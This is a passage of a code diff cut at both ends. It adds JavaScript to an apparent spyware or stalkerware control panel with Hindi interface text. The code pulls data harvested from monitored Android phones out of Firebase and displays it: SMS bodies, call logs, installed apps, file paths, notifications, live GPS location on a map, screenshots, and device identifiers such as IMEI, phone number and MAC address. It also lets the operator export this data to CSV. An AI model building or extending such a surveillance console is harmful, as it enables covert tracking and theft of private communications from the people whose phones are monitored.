+                             if (lastItemOnPage && lastItemOnPage[orderByFld] !== undefined) {
+                                sectionPaging.cursors[sectionPaging.currentPage] = lastItemOnPage[orderByFld];
+                            }
+                        }
+                    }
+                    
+                    // === UPDATED SEARCH TERM LOGIC ===
+                    let clientFilteredDisplayArray = [];
+                    const searchTermFromState = (filterState[sectionKey] && filterState[sectionKey].searchTerm)
+                                               ? filterState[sectionKey].searchTerm.toLowerCase()
+                                               : "";
+
+                    if (searchTermFromState) {
+                        clientFilteredDisplayArray = dataFromFirebase.filter(item => {
+                            if (sectionKey === 'messages') {
+                                return (item.address && String(item.address).toLowerCase().includes(searchTermFromState)) ||
+                                       (item.body && String(item.body).toLowerCase().includes(searchTermFromState));
+                            } else if (sectionKey === 'call-logs') {
+                                return (item.number && String(item.number).toLowerCase().includes(searchTermFromState));
+                            } else if (sectionKey === 'installed-apps') {
+                                return (item.appName && String(item.appName).toLowerCase().includes(searchTermFromState)) ||
+                                       (item.packageName && String(item.packageName).toLowerCase().includes(searchTermFromState));
+                            } else if (sectionKey === 'file-logs') {
+                                return (item.path && String(item.path).toLowerCase().includes(searchTermFromState));
+                            } else if (sectionKey === 'notifications') {
+                                return (item.appName && String(item.appName).toLowerCase().includes(searchTermFromState)) ||
+                                       (item.title && String(item.title).toLowerCase().includes(searchTermFromState)) ||
+                                       (item.text && String(item.text).toLowerCase().includes(searchTermFromState));
+                            }
+                            return true; 
+                        });
+                    } else {
+                        clientFilteredDisplayArray = dataFromFirebase;
+                    }
+                    // === END OF UPDATED SEARCH TERM LOGIC ===
+                                       
+                    sectionPaging.itemCountOnPage = clientFilteredDisplayArray.length;
+                    currentDataCache[dataPathInFirebase + '_page'] = clientFilteredDisplayArray; 
+
+                    if (clientFilteredDisplayArray.length > 0) {
+                        clientFilteredDisplayArray.forEach(item => {
+                            const row = tableBody.insertRow();
+                            const processedItem = dataProcessor ? dataProcessor(item) : item;
+                            columns.forEach(col => {
+                                const cell = row.insertCell();
+                                let value = processedItem[col.key];
+                                if (col.formatter) value = col.formatter(value, processedItem);
+                                else value = value !== null && value !== undefined ? sanitizeHTML(String(value)) : '<span class="text-muted fst-italic">N/A</span>';
+                                cell.innerHTML = value;
+                            });
+                        });
+                        displayNoData(sectionKey, false);
+                    } else { 
+                        let noDataMsg;
+                        if (searchTermFromState) { // Use searchTermFromState
+                            if (sectionPaging.hasMoreRawData) {
+                                noDataMsg = `आपकी खोज "${sanitizeHTML(searchTermFromState)}" से इस पेज पर कोई आइटम नहीं मिला। अगले पेज पर और आइटम हो सकते हैं।`;
+                            } else if (sectionPaging.currentPage > 1) {
+                                 noDataMsg = `आपकी खोज "${sanitizeHTML(searchTermFromState)}" से इस पेज पर कोई आइटम नहीं मिला।`;
+                            } else { 
+                                noDataMsg = `आपकी खोज "${sanitizeHTML(searchTermFromState)}" से कोई आइटम नहीं मिला।`;
+                            }
+                        } else { 
+                            noDataMsg = "इस डिवाइस के लिए कोई आइटम नहीं मिला।";
+                        }
+
+                        if (sectionPaging.currentPage === 1 && !searchTermFromState && !snapshot.exists()) { // Use searchTermFromState
+                            displayNoData(sectionKey, true); 
+                        } else {
+                            tableBody.innerHTML = `<tr><td colspan="${columns.length}" class="text-center text-muted p-4 fst-italic">${noDataMsg}</td></tr>`;
+                            displayNoData(sectionKey, false); 
+                        }
+                    }
+                } else { 
+                     const searchTermFromStateOnError = (filterState[sectionKey] && filterState[sectionKey].searchTerm) ? filterState[sectionKey].searchTerm.toLowerCase() : ""; // Added for consistency
+                     const noDataMsg = (searchTermFromStateOnError && sectionPaging.currentPage === 1) 
+                                        ? `आपकी खोज "${sanitizeHTML(searchTermFromStateOnError)}" से कोई आइटम नहीं मिला।`
+                                        : (sectionPaging.currentPage === 1 ? "इस डिवाइस के लिए कोई आइटम नहीं मिला।" : "इस पेज पर कोई आइटम नहीं मिला।");
+
+                    if (sectionPaging.currentPage === 1 && !searchTermFromStateOnError) {
+                        displayNoData(sectionKey, true);
+                    } else {
+                         tableBody.innerHTML = `<tr><td colspan="${columns.length}" class="text-center text-muted p-4 fst-italic">${noDataMsg}</td></tr>`;
+                         displayNoData(sectionKey, false);
+                    }
+                    currentDataCache[dataPathInFirebase + '_page'] = [];
+                    sectionPaging.itemCountOnPage = 0;
+                    sectionPaging.hasMoreRawData = false;
+                }
+                updatePaginationControlsUI(sectionKey);
+            };
+            
+            const errorCallback = (error) => {
+                console.error(`Error listening to ${sectionKey} for UID ${currentUID}:`, error);
+                initialDataLoadedForUid.add(`${currentUID}-${sectionKey}`);
+                displayLoading(sectionKey, false);
+                displayNoData(sectionKey, false);
+                displayError(sectionKey, true, `Failed to load ${sectionKey.replace('-', ' ')}. Error: ${error.message}`);
+                currentDataCache[dataPathInFirebase + '_page'] = [];
+                sectionPaging.itemCountOnPage = 0;
+                sectionPaging.hasMoreRawData = false;
+                updatePaginationControlsUI(sectionKey);
+            };
+
+            const unsubscribe = onValue(fbQuery, listenerCallback, errorCallback);
+            sectionPaging.activeListener = { ref: fbQuery, callback: listenerCallback, unsubscribe: unsubscribe };
+        }
+
+        function updatePaginationControlsUI(sectionKey) {
+            const sectionPaging = paginationState[sectionKey];
+            if (!sectionPaging) return;
+
+            const contentSection = document.getElementById(`${sectionKey}-content`);
+            if (!contentSection) return;
+            const controlsDiv = contentSection.querySelector('.pagination-controls');
+            const prevBtn = contentSection.querySelector('.prev-page-btn');
+            const nextBtn = contentSection.querySelector('.next-page-btn');
+            const pageInfo = contentSection.querySelector('.page-info');
+
+            if (!controlsDiv || !prevBtn || !nextBtn || !pageInfo) return;
+            
+            const isNoDataMessageVisible = contentSection.querySelector('.no-data-message-container').style.display !== 'none';
+            const isErrorMsgVisible = contentSection.querySelector('.error-message-container').style.display !== 'none';
+
+            const showControls = (sectionPaging.itemCountOnPage > 0 || sectionPaging.currentPage > 1 || sectionPaging.hasMoreRawData) && !isNoDataMessageVisible && !isErrorMsgVisible;
+            
+            controlsDiv.style.display = showControls ? 'block' : 'none';
+            
+            pageInfo.textContent = `Page ${sectionPaging.currentPage}`;
+            prevBtn.disabled = sectionPaging.currentPage === 1;
+            nextBtn.disabled = !sectionPaging.hasMoreRawData;
+        }
+
+        document.addEventListener('click', function(event) {
+            const target = event.target;
+            let sectionKeyToReload = null;
+
+            if (target.matches('.next-page-btn') || target.closest('.next-page-btn')) {
+                const btn = target.closest('.next-page-btn');
+                sectionKeyToReload = btn.dataset.sectionkey;
+                if (paginationState[sectionKeyToReload]) {
+                    paginationState[sectionKeyToReload].currentPage++;
+                }
+            } else if (target.matches('.prev-page-btn') || target.closest('.prev-page-btn')) {
+                 const btn = target.closest('.prev-page-btn');
+                sectionKeyToReload = btn.dataset.sectionkey;
+                if (paginationState[sectionKeyToReload] && paginationState[sectionKeyToReload].currentPage > 1) {
+                    paginationState[sectionKeyToReload].currentPage--;
+                }
+            }
+
+            if (sectionKeyToReload && currentUID) {
+                 triggerLoadForSectionTable(currentUID, sectionKeyToReload);
+            }
+        });
+
+        const handleSearchInput = debounce((sectionKey, searchTerm) => {
+            if (!filterState[sectionKey]) filterState[sectionKey] = {};
+            filterState[sectionKey].searchTerm = searchTerm;
+
+            if (paginationState[sectionKey]) { 
+                paginationState[sectionKey].currentPage = 1;
+                paginationState[sectionKey].cursors = [null]; 
+            }
+            if (currentUID) {
+                triggerLoadForSectionTable(currentUID, sectionKey);
+            }
+        }, 400); 
+
+        searchInputs.forEach(input => {
+            input.addEventListener('input', (e) => {
+                const sectionKey = e.target.dataset.sectionkey;
+                handleSearchInput(sectionKey, e.target.value);
+            });
+        });
+
+
+        function triggerLoadForSectionTable(uid, sectionKey) {
+            const loadFunctionsMap = {
+                'messages': () => loadMessages(uid),
+                'call-logs': () => loadCallLogs(uid),
+                'installed-apps': () => loadInstalledApps(uid),
+                'file-logs': () => loadFileLogs(uid),
+                'notifications': () => loadNotifications(uid)
+            };
+            if (loadFunctionsMap[sectionKey]) {
+                loadFunctionsMap[sectionKey]();
+            } else {
+                console.error("No table load function mapped for sectionKey:", sectionKey);
+            }
+        }
+
+
+        // 2. Messages (Paginated)
+        function loadMessages(uid) {
+            loadTableData(uid, 'sms', 'messages', 'messages-table-body',
+                [
+                    { key: 'date', formatter: formatTimestamp },
+                    { key: 'address', formatter: (val) => sanitizeHTML(val) },
+                    { key: 'body', formatter: (body) => {
+                        const sBody = sanitizeHTML(body || '');
+                        return sBody.length > 80 ? `<span title="${sBody.replace(/"/g, '&quot;')}">${sBody.substring(0, 80)}...</span>` : sBody;
+                        }
+                    },
+                    { key: 'type', formatter: (type) => {
+                        const typeMap = { 1: 'Inbox', 2: 'Sent', 3: 'Draft', 4: 'Outbox', 5: 'Failed', 6: 'Queued' };
+                        const typeName = typeMap[type] || `Unknown (${type})`;
+                        let badgeClass = 'bg-secondary-soft text-secondary-dark';
+                        if (type === 1) badgeClass = 'bg-info-soft text-info-dark'; 
+                        if (type === 2) badgeClass = 'bg-success-soft text-success-dark'; 
+                        return `<span class="badge ${badgeClass} rounded-pill py-1 px-2">${typeName}</span>`;
+                        }
+                    }
+                ],
+                null, 
+                { field: 'date', direction: 'desc' } 
+            );
+        }
+
+        // 3. Call Logs (Paginated)
+        function loadCallLogs(uid) {
+            loadTableData(uid, 'calls', 'call-logs', 'call-logs-table-body',
+                [
+                    { key: 'date', formatter: formatTimestamp },
+                    { key: 'number', formatter: (val) => sanitizeHTML(val) },
+                    { key: 'duration', formatter: formatDuration },
+                    { key: 'type', formatter: (type) => {
+                        const typeVal = String(type).toUpperCase();
+                        let badgeClass = 'bg-secondary-soft text-secondary-dark';
+                        let typeName = type || 'Unknown';
+
+                        if (typeVal.includes('INCOMING') || typeVal === '1') { badgeClass = 'bg-info-soft text-info-dark'; typeName = 'Incoming'; }
+                        else if (typeVal.includes('OUTGOING') || typeVal === '2') { badgeClass = 'bg-success-soft text-success-dark'; typeName = 'Outgoing'; }
+                        else if (typeVal.includes('MISSED') || typeVal === '3') { badgeClass = 'bg-warning-soft text-warning-dark'; typeName = 'Missed'; }
+                        else if (typeVal.includes('REJECTED') || typeVal === '5') { badgeClass = 'bg-danger-soft text-danger-dark'; typeName = 'Rejected'; }
+                        else if (typeVal.includes('BLOCKED') || typeVal === '6') { badgeClass = 'bg-dark-soft text-dark'; typeName = 'Blocked'; }
+                        return `<span class="badge ${badgeClass} rounded-pill py-1 px-2">${typeName}</span>`;
+                    }}
+                ],
+                null,
+                { field: 'date', direction: 'desc' }
+            );
+        }
+
+        // 4. Installed Apps (Paginated)
+        function loadInstalledApps(uid) {
+             loadTableData(uid, 'apps', 'installed-apps', 'installed-apps-table-body',
+                [
+                    { key: 'appName', formatter: (val) => sanitizeHTML(val || 'N/A') }, // Handle null appName
+                    { key: 'packageName', formatter: (pkg) => {
+                        const sPkg = sanitizeHTML(pkg || '');
+                        return sPkg.length > 35 ? `<span title="${sPkg.replace(/"/g, '&quot;')}">${sPkg.substring(0, 35)}...</span>` : sPkg;
+                        }
+                    },
+                    { key: 'versionName', formatter: (val) => sanitizeHTML(val || 'N/A') } 
+                ],
+                null,
+                { field: 'appName', direction: 'asc' } 
+            );
+        }
+
+        // 5. Battery Info (Non-paginated)
+        function loadBatteryInfo(uid) {
+            const sectionName = 'battery-info';
+            const dataContainer = document.getElementById(sectionName + '-data');
+            const batteryRef = ref(database, `devices/${uid}/battery`);
+
+            addDbListener(batteryRef, sectionName, (snapshot) => {
+                dataContainer.innerHTML = '';
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    currentDataCache['battery'] = [data]; 
+                    let html = '';
+                    let levelBadge = 'bg-danger-soft text-danger-dark';
+                    if (data.level > 50) levelBadge = 'bg-success-soft text-success-dark';
+                    else if (data.level > 20) levelBadge = 'bg-warning-soft text-warning-dark';
+
+                    html += `<div class="list-group-item d-flex justify-content-between align-items-center">
+                                <span><i class="fas fa-battery-half me-2 text-muted"></i>Level</span>
+                                <span class="badge ${levelBadge} rounded-pill fs-6">${data.level !== undefined ? data.level : 'N/A'}%</span>
+                             </div>`;
+                    html += `<div class="list-group-item d-flex justify-content-between align-items-center">
+                                <span><i class="fas fa-charging-station me-2 text-muted"></i>Charging Status</span>
+                                <span>${data.isCharging ? '<i class="fas fa-bolt text-success me-1"></i> Charging' : '<i class="fas fa-plug-circle-minus text-muted me-1"></i>Not Charging'}</span>
+                             </div>`;
+                    if(data.temperature !== undefined) html += `<div class="list-group-item d-flex justify-content-between align-items-center">
+                                <span><i class="fas fa-temperature-half me-2 text-muted"></i>Temperature</span>
+                                <span>${data.temperature}°C</span>
+                             </div>`;
+                    if(data.health) html += `<div class="list-group-item d-flex justify-content-between align-items-center">
+                                <span><i class="fas fa-heart-pulse me-2 text-muted"></i>Health</span>
+                                <span class="text-capitalize">${sanitizeHTML(data.health)}</span>
+                             </div>`;
+                    dataContainer.innerHTML = html;
+                    displayNoData(sectionName, false);
+                } else {
+                    displayNoData(sectionName, true);
+                    currentDataCache['battery'] = [];
+                }
+            });
+        }
+
+        // 6. GPS Location (Non-paginated)
+        function loadGpsLocation(uid) {
+            const sectionName = 'gps-location';
+            const mapDivId = 'gps-map';
+            const infoDiv = document.getElementById('gps-info-data');
+            
+            if (!map) { 
+                 try {
+                    map = L.map(mapDivId).setView([20, 0], 2); 
+                    L.tileLayer('https://{s}.tile.jawg.io/jawg-streets/{z}/{x}/{y}{r}.png?access-token={accessToken}', {
+                        attribution: '<a href="http://jawg.io" title="Tiles Courtesy of Jawg Maps" target="_blank">© <b>Jawg</b>Maps</a> © <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors',
+                        minZoom: 0,
+                        maxZoom: 20,
+                        subdomains: 'abcd',
+                        accessToken: 'SERVER_JAWG_TOKEN_PLACEHOLDER' // Replace with your Jawg token or use OSM directly
+                    }).on('tileerror', function(error, tile) { 
+                        console.warn("Jawg Maps tile layer error, possibly invalid token. Falling back to OpenStreetMap.", error);
+                        if (map.hasLayer(this)) map.removeLayer(this); 
+                         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                            maxZoom: 19,
+                            attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                        }).addTo(map);
+                    }).addTo(map);
+                 } catch (e) { 
+                    console.warn("Map initialization error, falling back to OpenStreetMap.", e);
+                    if(map && typeof map.remove === 'function') map.remove(); 
+                    map = L.map(mapDivId).setView([20,0],2);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        maxZoom: 19,
+                        attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                    }).addTo(map);
+                 }
+            }
+            
+            let marker;
+            const gpsRef = ref(database, `devices/${uid}/gps`);
+            addDbListener(gpsRef, sectionName, (snapshot) => {
+                infoDiv.innerHTML = '';
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    currentDataCache['gps'] = [data];
+
+                    if (data && data.latitude != null && data.longitude != null) { 
+                        const lat = parseFloat(data.latitude);
+                        const lng = parseFloat(data.longitude);
+
+                        if (!isNaN(lat) && !isNaN(lng)) {
+                            const latLng = [lat, lng];
+                            map.setView(latLng, 16);
+                            if (marker) {
+                                marker.setLatLng(latLng);
+                            } else {
+                                marker = L.marker(latLng, { icon: L.icon({ iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png', iconSize: [25, 41], iconAnchor: [12, 41] }) }).addTo(map);
+                            }
+                            marker.bindPopup(`<b>Location Details</b><br>Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>Accuracy: ${data.accuracy || 'N/A'}m<br>Time: ${formatTimestamp(data.timestamp)}`).openPopup();
+                            
+                            let infoHtml = `<div class="list-group-item"><strong><i class="fas fa-map-pin me-2 text-muted"></i>Latitude:</strong> ${lat.toFixed(5)}</div>`;
+                            infoHtml += `<div class="list-group-item"><strong><i class="fas fa-map-pin me-2 text-muted"></i>Longitude:</strong> ${lng.toFixed(5)}</div>`;
+                            if(data.accuracy !== undefined) infoHtml += `<div class="list-group-item"><strong><i class="fas fa-bullseye me-2 text-muted"></i>Accuracy:</strong> ${data.accuracy} m</div>`;
+                            if(data.speed !== undefined) infoHtml += `<div class="list-group-item"><strong><i class="fas fa-gauge-high me-2 text-muted"></i>Speed:</strong> ${parseFloat(data.speed).toFixed(2)} m/s</div>`;
+                            if(data.altitude !== undefined) infoHtml += `<div class="list-group-item"><strong><i class="fas fa-mountain-sun me-2 text-muted"></i>Altitude:</strong> ${parseFloat(data.altitude).toFixed(2)} m</div>`;
+                            infoHtml += `<div class="list-group-item"><strong><i class="far fa-clock me-2 text-muted"></i>Timestamp:</strong> ${formatTimestamp(data.timestamp)}</div>`;
+                            infoDiv.innerHTML = infoHtml;
+
+                            displayNoData(sectionName, false);
+                            if (document.getElementById(sectionName + '-content').classList.contains('active-section')) {
+                               setTimeout(() => { if(map) map.invalidateSize() }, 100);
+                            }
+                        } else {
+                             displayNoData(sectionName, true); 
+                        }
+                    } else {
+                        displayNoData(sectionName, true); 
+                    }
+                } else {
+                    displayNoData(sectionName, true);
+                    currentDataCache['gps'] = [];
+                }
+            });
+        }
+
+        // 7. File Logs (Paginated)
+        function loadFileLogs(uid) {
+            loadTableData(uid, 'files', 'file-logs', 'file-logs-table-body',
+                [
+                    { key: 'path', formatter: (p) => {
+                        const sPath = sanitizeHTML(p || '');
+                        const icon = sPath.includes('.') ? (sPath.match(/\.(jpeg|jpg|png|gif)$/i) ? 'fa-file-image' : (sPath.match(/\.(pdf)$/i) ? 'fa-file-pdf' : (sPath.match(/\.(doc|docx)$/i) ? 'fa-file-word' : 'fa-file-lines'))) : 'fa-folder';
+                        return sPath.length > 45 ? `<span title="${sPath.replace(/"/g, '&quot;')}"><i class="far ${icon} me-2 text-muted"></i> ${sPath.substring(0,15)}...${sPath.substring(sPath.length-25)}</span>` : `<i class="far ${icon} me-2 text-muted"></i> ${sPath}`;
+                        }
+                    },
+                    { key: 'size', formatter: (bytes) => {
+                        if (bytes === null || bytes === undefined || isNaN(bytes)) return '<span class="text-muted fst-italic">N/A</span>';
+                        if (bytes === 0) return '0 B';
+                        const k = 1024;
+                        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+                        const i = Math.floor(Math.log(bytes) / Math.log(k));
+                        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+                    }},
+                    { key: 'lastModified', formatter: formatTimestamp }
+                ],
+                null,
+                { field: 'lastModified', direction: 'desc' }
+            );
+        }
+
+        // 8. Screenshots (Non-paginated - gallery style)
+        function loadScreenshots(uid) {
+            const sectionName = 'screenshots';
+            const gallery = document.getElementById('screenshots-gallery');
+            const screenshotsRef = ref(database, `devices/${uid}/screenshots`);
+            const sortableScreenshots = []; 
+            let initialDataLoaded = false;
+
+            activeDBListeners = activeDBListeners.filter(listener => {
+                if (listener.section === sectionName && listener.uid === uid) {
+                    off(listener.ref, listener.type, listener.callback);
+                    return false; 
+                }
+                return true;
+            });
+
+            gallery.innerHTML = '';
+            currentDataCache['screenshots'] = []; 
+            if (!initialDataLoadedForUid.has(`${currentUID}-${sectionName}`)) {
+                displayLoading(sectionName, true);
+            }
+
+
+            const renderGallery = () => {
+                gallery.innerHTML = ''; 
+                sortableScreenshots.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+                
+                currentDataCache['screenshots'] = sortableScreenshots.map(s => ({ url: s.url, timestamp: s.timestamp || 'N/A' , _fbKey: s._fbKey}));
+
+                if (sortableScreenshots.length > 0) {
+                    sortableScreenshots.forEach(item => {
+                        if (item && item.url) {
+                            const imgContainer = document.createElement('div');
+                            imgContainer.className = 'screenshot-item';
+                            imgContainer.setAttribute('data-timestamp', formatTimestamp(item.timestamp, 'datetime'));
+                            imgContainer.setAttribute('data-key', item._fbKey); 
+
+                            const img = document.createElement('img');
+                            img.src = item.url;
+                            img.alt = 'Screenshot';
+                            img.loading = 'lazy'; 
+                            img.onerror = () => { 
+                                img.alt = 'Error loading screenshot'; 
+                                img.src = 'data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%22160%22%20height%3D%22160%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20160%20160%22%20preserveAspectRatio%3D%22none%22%3E%3Cdefs%3E%3Cstyle%20type%3D%22text%2Fcss%22%3E%23holder_1%20text%20%7B%20fill%3Argba(150%2C150%2C150%2C.9)%3Bfont-weight%3Anormal%3Bfont-family%3AHelvetica%2C%20monospace%3Bfont-size%3A10pt%20%7D%20%3C%2Fstyle%3E%3C%2Fdefs%3E%3Cg%3E%3Crect%20width%3D%22160%22%20height%3D%22160%22%20fill%3D%22%23DDD%22%3E%3C%2Frect%3E%3Cg%3E%3Ctext%20x%3D%2245%22%20y%3D%2285%22%3EError%20img%3C%2Ftext%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E';
+                            };
+                            img.onclick = () => window.open(item.url, '_blank');
+                            imgContainer.appendChild(img);
+                            gallery.appendChild(imgContainer);
+                        }
+                    });
+                    displayNoData(sectionName, false);
+                } else {
+                    displayNoData(sectionName, true);
+                }
+            };
+            
+            const onDataChange = (snapshot) => {
+                if (!initialDataLoaded) { // Only for the very first load from this listener
+                    initialDataLoadedForUid.add(`${currentUID}-${sectionName}`);
+                    displayLoading(sectionName, false);
+                    initialDataLoaded = true;
+                }
+                displayError(sectionName, false);
+                sortableScreenshots.length = 0; 
+
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    if (Array.isArray(data)) { 
+                        data.forEach((item, index) => {
+                             if (item && typeof item === 'object' && item.url) {
+                                sortableScreenshots.push({ ...item, _fbKey: String(index) });
+                            } else if (typeof item === 'string') { 
+                                sortableScreenshots.push({ url: item, timestamp: null, _fbKey: String(index) });
+                            }
+                        });
+                    } else if (typeof data === 'object') { 
+                        Object.keys(data).forEach(key => {
+                            const item = data[key];
+                            if (item && typeof item === 'object' && item.url) {
+                                sortableScreenshots.push({ ...item, _fbKey: key });
+                            } else if (typeof item === 'string') { 
+                                sortableScreenshots.push({ url: item, timestamp: null, _fbKey: key });
+                            }
+                        });
+                    }
+                }
+                renderGallery(); 
+            };
+
+            const onError = (error) => {
+                console.error(`Error listening to ${sectionName} for UID ${uid}:`, error);
+                if (!initialDataLoaded) { // If error on first load
+                    initialDataLoadedForUid.add(`${currentUID}-${sectionName}`);
+                    displayLoading(sectionName, false);
+                    initialDataLoaded = true;
+                }
+                displayNoData(sectionName, false);
+                displayError(sectionName, true, `Failed to load ${sectionName.replace('-', ' ')}. Error: ${error.message}`);
+                currentDataCache['screenshots'] = [];
+                sortableScreenshots.length = 0;
+                renderGallery(); 
+            };
+            
+            const queryRef = query(screenshotsRef, orderByChild('timestamp'));
+            const listenerUnsubscribe = onValue(queryRef, onDataChange, onError);
+
+            activeDBListeners.push({ 
+                ref: queryRef, 
+                callback: listenerUnsubscribe, // Store the unsubscribe function
+                type: 'value', 
+                section: sectionName, 
+                uid: uid 
+            });
+        }
+
+
+        // 9. Notifications (Paginated)
+        function loadNotifications(uid) {
+            loadTableData(uid, 'notifications', 'notifications', 'notifications-table-body',
+                [
+                    { key: 'timestamp', formatter: formatTimestamp },
+                    { key: 'appName', formatter: (val) => sanitizeHTML(val || 'N/A') },
+                    { key: 'title', formatter: (t) => {
+                        const sTitle = sanitizeHTML(t || '');
+                        return sTitle.length > 40 ? `<span title="${sTitle.replace(/"/g, '&quot;')}">${sTitle.substring(0, 40)}...</span>` : sTitle;
+                        }
+                    },
+                    { key: 'text', formatter: (t) => {
+                        const sText = sanitizeHTML(t || '');
+                        return sText.length > 60 ? `<span title="${sText.replace(/"/g, '&quot;')}">${sText.substring(0, 60)}...</span>` : sText;
+                        }
+                    }
+                ],
+                null,
+                { field: 'timestamp', direction: 'desc' }
+            );
+        }
+
+        // 10. Device Info (Non-paginated)
+        function loadDeviceInfo(uid) {
+            const sectionName = 'device-info';
+            const dataContainer = document.getElementById(sectionName + '-data');
+            const infoRef = ref(database, `devices/${uid}/info`);
+
+            addDbListener(infoRef, sectionName, (snapshot) => {
+                dataContainer.innerHTML = '';
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    currentDataCache['info'] = [data]; 
+                    let html = '';
+                    const keyOrder = ['model', 'manufacturer', 'androidVersion', 'sdkVersion', 'imei', 'serialNumber', 'phoneNumber', 'ipAddress', 'macAddress', 'wifiSSID', 'totalRAM', 'availableRAM', 'totalStorage', 'availableStorage', 'isRooted', 'alias', 'lastSeen']; 
+                    const dataMap = new Map(Object.entries(data));
+                    
+                    const iconsMap = {
+                        model: 'fa-mobile-screen-button', manufacturer: 'fa-industry', androidVersion: 'fa-android', sdkVersion: 'fa-cogs',
+                        imei: 'fa-barcode', serialNumber: 'fa-hashtag', phoneNumber: 'fa-phone-square', ipAddress: 'fa-network-wired', macAddress: 'fa-ethernet',
+                        wifiSSID: 'fa-wifi', totalRAM: 'fa-memory', availableRAM: 'fa-memory', totalStorage: 'fa-hdd', availableStorage: 'fa-hdd',
+                        isRooted: 'fa-user-shield', alias: 'fa-signature', lastSeen: 'fa-clock'
+                    };
+
+                    keyOrder.forEach(key => {
+                        if (dataMap.has(key)) {
+                            let value = dataMap.get(key);
+                            let displayValue = (value === null || value === undefined) ? '<span class="text-muted fst-italic">N/A</span>' : sanitizeHTML(String(value));
+                            if (key === 'lastSeen') displayValue = formatTimestamp(value); // This will use data.lastSeen (camelCase) if it exists in dataMap
+                            if (key === 'last_seen' && !dataMap.has('lastSeen')) displayValue = formatTimestamp(value); // Handle explicit last_seen
+                            
+                            if (key === 'isRooted') displayValue = value ? '<span class="badge bg-danger-soft text-danger-dark">Yes</span>' : '<span class="badge bg-success-soft text-success-dark">No</span>';
+                            if (key.toLowerCase().includes('ram') || key.toLowerCase().includes('storage')) {
+                                if (!isNaN(parseFloat(value))) displayValue = formatBytes(parseFloat(value));
+                            }
+
+                            const iconClass = iconsMap[key] || 'fa-tag';
+                            html += `<div class="list-group-item d-flex justify-content-between align-items-center">
+                                        <span><i class="fas ${iconClass} me-2 text-muted fa-fw"></i>${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</span>
+                                        <span class="text-end text-break" style="max-width: 60%;">${displayValue}</span>
+                                     </div>`;
+                            dataMap.delete(key);
+                        }
+                    });
+                    dataMap.forEach((value, key) => { 
+                         let displayValue = (value === null || value === undefined) ? '<span class="text-muted fst-italic">N/A</span>' : sanitizeHTML(String(value));
+                         if (key === 'lastSeen' || key === 'last_seen') displayValue = formatTimestamp(value); // Ensure formatting for any case
+
+                         const iconClass = iconsMap[key] || 'fa-tag';
+                         html += `<div class="list-group-item d-flex justify-content-between align-items-center">
+                                    <span><i class="fas ${iconClass} me-2 text-muted fa-fw"></i>${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</span>
+                                    <span class="text-end text-break" style="max-width: 60%;">${displayValue}</span>
+                                 </div>`;
+                    });
+
+                    dataContainer.innerHTML = html;
+                    displayNoData(sectionName, false);
+                } else {
+                    displayNoData(sectionName, true);
+                    currentDataCache['info'] = [];
+                }
+            });
+        }
+        function formatBytes(bytes, decimals = 2) {
+            if (bytes == null || isNaN(bytes)) return 'N/A Bytes'; 
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const dm = decimals < 0 ? 0 : decimals;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+        }
+        
+        // --- CSV EXPORT ---
+        function exportToCSV(dataArray, filename = 'export.csv') {
+            if (!dataArray || dataArray.length === 0) {
+                showToast("No data available to export for this section.", "info", "Export Info");
+                return;
+            }
+            const firstItem = dataArray[0];
+            if (typeof firstItem !== 'object' || firstItem === null) {
+                // Handle array of simple values (e.g., strings, numbers)
+                const headers = ["Value"];
+                let csvContent = headers.join(",") + "\r\n";
+                dataArray.forEach(item => {
+                    let cell = item === null || item === undefined ? "" : String(item);
+                    cell = cell.replace(/"/g, '""'); // Escape double quotes
+                    if (cell.includes(",") || cell.includes("\r") || cell.includes("\n") || cell.includes('"')) {
+                        cell = `"${cell}"`; // Enclose in double quotes if it contains comma, newline or double quote
+                    }
+                    csvContent += cell + "\r\n";
+                });
+                downloadCSV(csvContent, filename);
+                return;
+            }
+            // Handle array of objects
+            const headers = Object.keys(firstItem);
+            let csvContent = headers.map(header => `"${header.replace(/"/g, '""')}"`).join(",") + "\r\n";
+
+            dataArray.forEach(row => {
+                const values = headers.map(header => {
+                    let cell = row[header] === null || row[header] === undefined ? "" : String(row[header]);
+                    cell = cell.replace(/"/g, '""'); // Escape double quotes
+                    // Enclose in double quotes if it contains comma, newline or double quote
+                    if (cell.includes(",") || cell.includes("\r") || cell.includes("\n") || cell.includes('"')) {
+                        cell = `"${cell}"`;
+                    }
+                    return cell;
+                });
+                csvContent += values.join(",") + "\r\n";
+            });
+            downloadCSV(csvContent, filename);
+        }
+        function downloadCSV(csvContent, filename) {
+            const BOM = "\uFEFF"; // Byte Order Mark for UTF-8
+            const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement("a");
+            if (link.download !== undefined) {
+                const url = URL.createObjectURL(blob);
+                link.setAttribute("href", url);
+                link.setAttribute("download", filename);
+                link.style.visibility = 'hidden';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url);
+                showToast(`Data exported to ${filename}`, "success", "Export Successful");
+            } else {
